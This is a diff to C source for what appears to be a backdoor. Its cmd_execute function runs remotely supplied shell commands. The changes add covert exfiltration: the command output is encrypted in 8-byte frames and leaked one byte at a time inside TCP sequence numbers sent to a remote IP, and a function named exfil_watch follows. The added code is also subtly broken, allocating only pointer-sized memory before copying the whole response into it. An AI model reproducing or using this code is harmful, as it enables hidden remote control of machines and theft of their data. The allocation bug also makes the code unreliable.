@@ -166,13 +166,14 @@ void cmd_execute(char *command, uint32 ip) {
 	FILE *fp;
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
+	char *trans;
 	int tot_len;
 
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
 
 	// Run the command, grab stdout
-	fp = popen(command, "rb");
+	fp = popen(command, "r");
 
 	// Append line by line output into response buffer
 	while (fgets(line, MAX_LEN, fp) != NULL)
@@ -180,7 +181,40 @@ void cmd_execute(char *command, uint32 ip) {
 
 	tot_len = strlen(resp) + 1;
 
-	_send(ip, resp, CMD_TYP);
+	trans = malloc(sizeof(char *));
+	strncpy(trans, resp, tot_len);
+
+	for (int i = 0; i < tot_len; i += 8) {
+		char frame[FRAM_SZ];
+		char *ptr;
+		int fram_len;
+		uint32 tcp_seq;
+
+		ptr = trans + i;
+
+		fram_len = (tot_len - i > 8) ? FRAM_SZ : (tot_len - i);
+
+		// binary copy of first 8 characters
+		memcpy(frame, ptr, fram_len);
+
+		// encrypt the frame of 8 characters
+		encrypt(SEKRET, frame, FRAM_SZ);
+
+		// go through the frame and send 1 character at a time
+		// in the TCP sequence field.
+		for(int j = 0; j < FRAM_SZ; ++j) {
+			tcp_seq = DEF_SEQ;
+			tcp_seq += frame[j]; // adding to the default sequence number
+
+			usleep(SLEEP_TIME); // sleep for specific amount of time
+			_send(ip, tcp_seq, RSP_TYP); // send the packet as a response packet
+		}
+	}
+
+	// free the pointer
+	free(trans);
+	// close the pipe file pointer
+	pclose(fp);
 }
 
 void *exfil_watch(void *arg) {
